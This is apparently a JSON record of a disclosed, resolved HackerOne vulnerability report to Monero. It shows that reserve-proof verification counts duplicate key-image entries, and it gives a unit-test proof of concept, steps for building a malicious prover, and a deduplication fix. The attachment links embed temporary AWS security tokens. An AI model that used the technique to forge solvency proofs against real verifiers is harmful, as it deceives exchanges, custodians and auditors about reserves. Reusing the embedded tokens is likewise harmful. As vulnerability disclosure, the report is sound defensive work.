@@ -1,0 +1,138 @@
+{
+  "id": 3699522,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjk5NTIy",
+  "url": "https://hackerone.com/reports/3699522",
+  "title": "`check_reserve_proof` counts duplicate entries: one output can inflate `total`",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-04-27T22:53:10.766Z",
+  "submitted_at": "2026-04-27T22:53:11.111Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bebensap",
+    "url": "/bebensap",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f03exbfz2vld0bvyw9b3hiabdbua/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-08-05T10:23:55.815Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-08-05T10:23:54.985Z",
+  "team_member_agreed_on_going_public_at": "2026-07-21T23:48:53.988Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Repository:** [`monero-project/monero`](https://github.com/monero-project/monero) — `src/wallet/wallet2.cpp`, `src/wallet/wallet_rpc_server.cpp`. Snapshot: `master @ 3ad4a5ee8` (`v0.18.1.0-3ad4a5ee8`).\n\n## Summary\n\nReserve proofs are untrusted blobs. The verifier walks a vector of `reserve_proof_entry` and, for each row, checks signatures against a prefix hash, then adds that row’s output amount to `total` (and `spent` when the daemon says the key image is spent). Nothing in that loop requires each `key_image` or each `(txid, index_in_tx)` to appear only once.\n\nThe prefix is built by concatenating the message, the claimed address, and every `key_image` in order—the same layout the honest `get_reserve_proof` uses:\n\n```cpp\nstd::string prefix_data = message;\nprefix_data.append((const char*)&address, sizeof(cryptonote::account_public_address));\nfor (size_t i = 0; i < proofs.size(); ++i)\n  prefix_data.append((const char*)&proofs[i].key_image, sizeof(crypto::key_image));\ncrypto::hash prefix_hash;\ncrypto::cn_fast_hash(prefix_data.data(), prefix_data.size(), prefix_hash);\n```\n\nIf you repeat the same output N times in `proofs`, you also repeat N copies of that key image in `prefix_data`, recompute `prefix_hash`, and sign against that hash. The owner of the output already has the keys to produce valid `shared_secret_sig` and `key_image_sig` for each row; those checks are per-row and do not see “this key image was already used.”\n\nThe accounting is flat:\n\n```cpp\nfor (size_t i = 0; i < proofs.size(); ++i)\n{\n  // ... fetch tx, verify proofs, derive output ...\n  total += amount;\n  if (kispent_res.spent_status[i])\n    spent += amount;\n}\n```\n\nSo the reported reserve scales with how many times the same row appears, not with how many distinct outputs exist on-chain. Stock `get_reserve_proof` only emits each selected transfer once, but nothing stops a custom prover from serializing duplicates; `on_check_reserve_proof` just forwards into `check_reserve_proof`.\n\n## Releases Affected\n\nRe-checked on `master @ 3ad4a5ee8` against the local tree. Issue is in the verifier logic, not a recent regression; any branch with this reserve-proof path has the same gap.\n\n## Steps to Reproduce\n\n`check_reserve_proof` needs a daemon for `/gettransactions` and `/is_key_image_spent`, so the checked proof below lives in `tests/unit_tests/reserve_proof.cpp` and only rebuilds the prefix, the per-entry `check_tx_proof` / `check_ring_signature` chain, and a toy `total += amount` loop (logging to stdout is in the tree; trimmed here):\n\n```cpp\nTEST(reserve_proof, duplicateKeyImagesReuseValidEntrySignatures)\n{\n  constexpr size_t duplicate_count = 3;\n  constexpr int reserve_proof_version = 2;\n  const std::string message = \"unit-test-duplicate-ki-reserve-proof\";\n\n  cryptonote::account_base account;\n  account.generate();\n  const cryptonote::account_keys &keys = account.get_keys();\n  std::unordered_map<crypto::public_key, cryptonote::subaddress_index> subaddresses;\n  subaddresses[keys.m_account_address.m_spend_public_key] = {0, 0};\n\n  crypto::public_key tx_pub;\n  crypto::secret_key tx_sec;\n  crypto::generate_keys(tx_pub, tx_sec, tx_sec, false);\n\n  crypto::key_derivation recv_derivation;\n  ASSERT_TRUE(keys.get_device().generate_key_derivation(tx_pub, keys.m_view_secret_key, recv_derivation));\n\n  crypto::public_key out_pub;\n  ASSERT_TRUE(crypto::derive_public_key(recv_derivation, 0, keys.m_account_address.m_spend_public_key, out_pub));\n\n  cryptonote::keypair ephemeral;\n  crypto::key_image ki;\n  ASSERT_TRUE(cryptonote::generate_key_image_helper(keys, subaddresses, out_pub, tx_pub, {}, 0, ephemeral, ki, keys.get_device()));\n\n  const crypto::public_key shared_secret =\n      rct::rct2pk(rct::scalarmultKey(rct::pk2rct(tx_pub), rct::sk2rct(keys.m_view_secret_key)));\n\n  std::string prefix_data = message;\n  prefix_data.append((const char *)&keys.m_account_address, sizeof(cryptonote::account_public_address));\n  for (size_t i = 0; i < duplicate_count; ++i)\n    prefix_data.append((const char *)&ki, sizeof(crypto::key_image));\n  crypto::hash prefix_hash;\n  crypto::cn_fast_hash(prefix_data.data(), prefix_data.size(), prefix_hash);\n\n  crypto::signature shared_secret_sig;\n  crypto::signature key_image_sig;\n  crypto::generate_tx_proof(prefix_hash, keys.m_account_address.m_view_public_key, tx_pub, boost::none,\n      shared_secret, keys.m_view_secret_key, shared_secret_sig);\n  const crypto::public_key *const pubs[1] = {&out_pub};\n  crypto::generate_ring_signature(prefix_hash, ki, pubs, 1, ephemeral.sec, 0, &key_image_sig);\n\n  crypto::signature spend_sig;\n  crypto::generate_signature(prefix_hash, keys.m_account_address.m_spend_public_key, keys.m_spend_secret_key, spend_sig);\n  ASSERT_TRUE(crypto::check_signature(prefix_hash, keys.m_account_address.m_spend_public_key, spend_sig));\n\n  for (size_t row = 0; row < duplicate_count; ++row)\n  {\n    ASSERT_TRUE(crypto::check_tx_proof(prefix_hash, keys.m_account_address.m_view_public_key, tx_pub, boost::none,\n        shared_secret, shared_secret_sig, reserve_proof_version));\n    ASSERT_TRUE(crypto::check_ring_signature(prefix_hash, ki, pubs, 1, &key_image_sig));\n  }\n\n  constexpr uint64_t output_amount = 7000000000000;\n  uint64_t total_as_verifier = 0;\n  for (size_t row = 0; row < duplicate_count; ++row)\n    total_as_verifier += output_amount;\n  ASSERT_EQ(total_as_verifier, duplicate_count * output_amount);\n}\n```\n\nBuild and run only that test:\n\n```bash\ncmake -S /home/beni/Monero/monero -B /home/beni/Monero/monero/build/release \\\n  -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=ON\ncmake --build /home/beni/Monero/monero/build/release -j\"$(nproc)\" --target unit_tests\n\n/home/beni/Monero/monero/build/release/tests/unit_tests/unit_tests \\\n  --gtest_filter=reserve_proof.duplicateKeyImagesReuseValidEntrySignatures \\\n  --data-dir /home/beni/Monero/monero/tests/data\n```\n\n`wallet2.cpp` is huge; if the linker machine runs out of RAM, drop parallelism (`-j1`).\n\nObserved output (the middle block is printed by the test; `prefix_hash` / `key_image` change every run because the account is random):\n\n```text\n[ RUN      ] reserve_proof.duplicateKeyImagesReuseValidEntrySignatures\n\n=== reserve_proof.duplicateKeyImagesReuseValidEntrySignatures ===\n...\n--- Accounting (mirrors check_reserve_proof: total += amount each row) ---\n  single on-chain output amount (atomic units): 7000000000000\n  proof rows summed:                              3\n  reported total without dedup:                 21000000000000\n  inflation vs one output:                      3x\n...\n\n[       OK ] reserve_proof.duplicateKeyImagesReuseValidEntrySignatures (4 ms)\n[  PASSED  ] 1 test.\n```\n{F5812418}\nWhat the test proves:\n\n1. The prefix can list the same `key_image` multiple times; `cn_fast_hash` still yields a single `prefix_hash` that the prover can sign.\n2. One set of entry signatures verifies for every duplicate row (`check_tx_proof` / `check_ring_signature` are called `duplicate_count` times with the same inputs).\n3. Summing a fixed `output_amount` once per row gives `duplicate_count × output_amount`—same shape as `total += amount` in the wallet.\n\nTo see the same behaviour behind a real RPC `check_reserve_proof`, build wallet + daemon + `functional_tests`, temporarily duplicate `selected_transfers` in `get_reserve_proof` after it is finalized (simulates a malicious prover; the verifier stays untouched), regenerate a proof, and call `check_reserve_proof`: `good` stays true while `total` jumps by the duplication factor. Remove the hack and `total` returns to the real balance.\n\n## Possible Solution\n\nBefore hitting the daemon or summing amounts, reject duplicates:\n\n```cpp\nstd::unordered_set<crypto::key_image> seen_key_images;\nstd::set<std::pair<crypto::hash, uint64_t>> seen_outputs;\n\nfor (const reserve_proof_entry &proof : proofs)\n{\n  THROW_WALLET_EXCEPTION_IF(!seen_key_images.insert(proof.key_image).second,\n      error::wallet_internal_error, \"Duplicate key image in reserve proof\");\n  THROW_WALLET_EXCEPTION_IF(!seen_outputs.emplace(proof.txid, proof.index_in_tx).second,\n      error::wallet_internal_error, \"Duplicate output in reserve proof\");\n}\n```\n\nAfter that lands, flip the gtest to expect failure/rejection when a second identical row appears, and keep the current file as a reference for what used to verify cleanly.\n\nThis should ship together with the RingCT amount binding in `reports/critical-wallet-check-reserve-proof-unverified-rct-ecdh-amount-overstates-reserves.md`: duplicate rows and bogus decoded amounts are separate ways to lie about reserves.\n\n## Impact\n\nThis does not empty a wallet; it makes `check_reserve_proof` lie about how much XMR backs an address. Anyone treating that RPC as a solvency check—exchange, custodian, lender, bridge, or ad hoc auditor—can be shown a proof that verifies while `total` is several times the real position. The unit test above is evidence of the crypto/accounting shape, not a polished one-liner exploit against mainnet.\n\n## Note\n\nPrepared with editor/AI help on wording and layout; line references and build commands were checked against the local tree at `3ad4a5ee8`.\n\n## Bounty\n\nIf this qualifies for a bounty, XMR can be sent to:\n\n`47TUANy82gtBFMvsFwyA3hE98PzgKSmxNia3n9fpvSadDWs234M7oWfevXqYxKmy3d9hSp1TH82gX4JWvNEUupse2s92maV`",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5812417,
+      "file_name": "reserve_proof.cpp",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j9omq9tpik42qxsvckawbec9vr15?response-content-disposition=attachment%3B%20filename%3D%22reserve_proof.cpp%22%3B%20filename%2A%3DUTF-8%27%27reserve_proof.cpp&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3TEOZIZI%2F20260805%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260805T115335Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFkaCXVzLXdlc3QtMiJHMEUCIQCU7HcBlvpnQlw5FALmm7ZvBHSaxL8%2FNMfnscuyQjhM3QIgAI%2BZ3GIKuZXduy1L5gYqV1PrqZP5GLfvmTsL3YsJstgqsgUIIhADGgwwMTM2MTkyNzQ4NDkiDDhGlVU6CJZ%2BLELl%2FCqPBSFPNaHl0l5%2Fj%2F%2FsLaHCTD7PQzGImImNs8PncTb9E2102segwZR%2BK0n4IwhC%2BUVw0INhLRm0V2UmWk4LXjEzri0q3M3ZXPdgKC3S%2BAXgIPdBKTn%2BwwkopP%2BeeJQDtABGjMvskYuxyOSYuEHgQTFkScnAsF1vkoaIvH%2BV%2FnZzJ1H3lzEnq8EjTE0BaVcP2dE6MI2ltvujQEADkAajGJlDw8Td9%2BTEdU%2BMR3KOHElGE3Z%2FK3Fd1JWumgiK9dRoqq2V0CWMtCB1dl%2BjSYCTuBlwMVXemrkhYgdz%2FyvQarO2oJWgh33D90aYASjc5RApMGYE%2FbqZf25fDwYo3vVZIsSrN11V1ab6y2bMdMiH2flsl565CMmZaP9BljSIY9Fm1T4T51tMOFCt9DJ3CO%2F78YHtXZqQO5G4Ftwdwzwlp42JprLk47N3MY760c5uw3VTx9U%2FsTj5SpDMU4OPRIt89Ucu%2B%2BkCX4yhU2ztTrYX1%2BzZX9LyqKRUnh7vO1yhs5ST091j5iEmdQfEyjVYiMGJnerIoOVyLszF3VZlg87cKEptlPl7u8yMvH9YZaGSW%2BHZ%2FdZsQzFV4Q6rk5nL0x61xjvAp9WEgBAftB8HVW8Lz6F9adPQ7XW6oB%2BR3Zq%2B5I4dRiC5MAOK762sn2le8S6iKW3K0wLF1MdjFCFjnYlnq%2FSCnmENCuWzDdl5hRnsMj5gN%2BIHtNtMZRxbjKVYMCo499EMQ2oAquegyZJQ5b7NhfEnKZgw8%2Bvubix1mP28QSg4MF%2BATkYpLTU74vsDWwbohXjLBTYLx%2Bh31rP%2BRt%2FyqTVCULU%2FCDWdweh6OmIhnY8ecT%2F7ZRclTSvW2jK8JpjQsCADXEiCqV1o6GVLmMlejaQXpjEw3%2FTL0wY6sQGyYUTVDUKEG6DGfK%2BubXEJBNYQ45VewGslWavBYJox%2F716edQheYRWI1GygVcrF86Tp4B4aCXTcChtQ6CLVIhINvUWoOoyBHnSIqwRWXcB6T4e1hYLRkb%2B6N7hQTzxLoRjw05uBg5OWsLbn6lTiE1v%2BJ78ZiowU0pU2gMegBeyoL0VNkWTir4SgfYG%2FnasTlE9IBxhTk0TIsJ1HiqM%2FO9ZdvinPe5TnWZLYJqPASe9Y7o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dd4b7c769cb890ed3ae6cd82b056a3cedf571d232735ecf15b56c2c67b53143e",
+      "file_size": 7380,
+      "type": "text/x-c++src",
+      "moderated": null
+    },
+    {
+      "id": 5812418,
+      "file_name": "Screenshot_2026-04-28_054812.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9287mc0bqwf0ntwmj6ht1qhu7ybn?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-04-28_054812.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-04-28_054812.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3TEOZIZI%2F20260805%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260805T115335Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFkaCXVzLXdlc3QtMiJHMEUCIQCU7HcBlvpnQlw5FALmm7ZvBHSaxL8%2FNMfnscuyQjhM3QIgAI%2BZ3GIKuZXduy1L5gYqV1PrqZP5GLfvmTsL3YsJstgqsgUIIhADGgwwMTM2MTkyNzQ4NDkiDDhGlVU6CJZ%2BLELl%2FCqPBSFPNaHl0l5%2Fj%2F%2FsLaHCTD7PQzGImImNs8PncTb9E2102segwZR%2BK0n4IwhC%2BUVw0INhLRm0V2UmWk4LXjEzri0q3M3ZXPdgKC3S%2BAXgIPdBKTn%2BwwkopP%2BeeJQDtABGjMvskYuxyOSYuEHgQTFkScnAsF1vkoaIvH%2BV%2FnZzJ1H3lzEnq8EjTE0BaVcP2dE6MI2ltvujQEADkAajGJlDw8Td9%2BTEdU%2BMR3KOHElGE3Z%2FK3Fd1JWumgiK9dRoqq2V0CWMtCB1dl%2BjSYCTuBlwMVXemrkhYgdz%2FyvQarO2oJWgh33D90aYASjc5RApMGYE%2FbqZf25fDwYo3vVZIsSrN11V1ab6y2bMdMiH2flsl565CMmZaP9BljSIY9Fm1T4T51tMOFCt9DJ3CO%2F78YHtXZqQO5G4Ftwdwzwlp42JprLk47N3MY760c5uw3VTx9U%2FsTj5SpDMU4OPRIt89Ucu%2B%2BkCX4yhU2ztTrYX1%2BzZX9LyqKRUnh7vO1yhs5ST091j5iEmdQfEyjVYiMGJnerIoOVyLszF3VZlg87cKEptlPl7u8yMvH9YZaGSW%2BHZ%2FdZsQzFV4Q6rk5nL0x61xjvAp9WEgBAftB8HVW8Lz6F9adPQ7XW6oB%2BR3Zq%2B5I4dRiC5MAOK762sn2le8S6iKW3K0wLF1MdjFCFjnYlnq%2FSCnmENCuWzDdl5hRnsMj5gN%2BIHtNtMZRxbjKVYMCo499EMQ2oAquegyZJQ5b7NhfEnKZgw8%2Bvubix1mP28QSg4MF%2BATkYpLTU74vsDWwbohXjLBTYLx%2Bh31rP%2BRt%2FyqTVCULU%2FCDWdweh6OmIhnY8ecT%2F7ZRclTSvW2jK8JpjQsCADXEiCqV1o6GVLmMlejaQXpjEw3%2FTL0wY6sQGyYUTVDUKEG6DGfK%2BubXEJBNYQ45VewGslWavBYJox%2F716edQheYRWI1GygVcrF86Tp4B4aCXTcChtQ6CLVIhINvUWoOoyBHnSIqwRWXcB6T4e1hYLRkb%2B6N7hQTzxLoRjw05uBg5OWsLbn6lTiE1v%2BJ78ZiowU0pU2gMegBeyoL0VNkWTir4SgfYG%2FnasTlE9IBxhTk0TIsJ1HiqM%2FO9ZdvinPe5TnWZLYJqPASe9Y7o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d1f130343698736df88164a6803fb7d3acd72072dd64ca23c1682999ac569f7d",
+      "file_size": 112252,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-08-20T23:48:54.459Z",
+  "allow_singular_disclosure_after": 1338918.925124225,
+  "singular_disclosure_allowed": false,
+  "vote_count": 1,
+  "voters": [
+    "2026"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
